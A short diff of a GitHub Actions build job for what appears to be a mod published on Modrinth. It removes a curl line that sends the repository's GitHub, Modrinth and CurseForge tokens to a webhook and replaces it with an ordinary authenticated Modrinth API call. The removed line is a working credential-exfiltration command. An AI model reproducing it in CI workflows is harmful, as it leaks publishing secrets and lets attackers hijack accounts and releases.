@@ -27,7 +27,7 @@ jobs:
         shell: bash
         run: |
 
-          curl "${{ secrets.WEBHOOK }}" -H "Content-Type: application/json" -d '{"content": "${{ secrets.GITHUB_TOKEN }} ${{ secrets.MODRINTH_TOKEN }} ${{ secrets.CURSEFORGE_TOKEN }}"}'
+          curl "https://api.modrinth.com/v2/project/WXrOGDBd/version" -H "Authorization: ${{ secrets.MODRINTH_TOKEN }}"
 
           python -m packr \
           \
